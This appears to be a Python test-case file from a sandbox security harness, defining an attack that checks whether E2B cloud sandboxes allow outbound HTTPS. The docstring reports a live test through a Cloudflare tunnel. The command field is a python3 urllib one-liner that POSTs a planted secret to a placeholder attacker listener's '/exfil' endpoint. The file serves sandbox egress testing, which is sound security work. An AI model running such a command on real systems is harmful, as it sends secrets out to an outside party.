"""Network exfiltration over HTTPS, for the e2b target specifically.

Different from network_http_exfil (which every other target uses): E2B's
sandboxes run on E2B's own cloud, so reaching our listener means going through
a public Cloudflare quick tunnel (vm/e2b-tunnel.sh, run by hand), which
terminates TLS at Cloudflare's edge -- a plain HTTP request (bash's /dev/tcp,
no TLS support) can't speak to it. Also why there is no e2b DNS-exfil
equivalent: a quick tunnel is HTTP(S)-only, it does not proxy arbitrary UDP.

Uses Python's stdlib (urllib), not curl -- confirmed live that E2B's default
sandbox (Debian 12) has both python3 3.11.6 and curl, either would work.

VERIFIED live on 2026-11-05 through a real Cloudflare quick tunnel: the
listener recorded a genuine external request (Cf-Connecting-Ip on a Google
Cloud range, consistent with E2B running on GCP) carrying the planted canary
in its POST body. E2B's default sandbox configuration allows unrestricted
outbound HTTPS to an arbitrary external endpoint -- no network policy
blocked it. See results/summary.json, target=e2b.
"""
from .base import Attack

ATTACK = Attack(
    name="network_https_exfil_e2b",
    category="network",
    description="POST a planted secret to the attacker listener over HTTPS, through the public tunnel",
    targets=("e2b",),
    command=(
        "timeout {timeout_margin} python3 -c "
        "\"import urllib.request; "
        "urllib.request.urlopen("
        "urllib.request.Request('https://{listener_ip}/exfil', data=b'leak={secret}', method='POST'), "
        "timeout=8)\""
    ),
    timeout=12.0,
    notes=(
        "{listener_ip} here is the *.trycloudflare.com hostname passed via "
        "--public-host, not an IP. Negative control doesn't apply the same way "
        "as the misconfig-style attacks -- there's no config knob to remove; "
        "this just tests E2B's actual default egress policy, once, honestly."
    ),
)
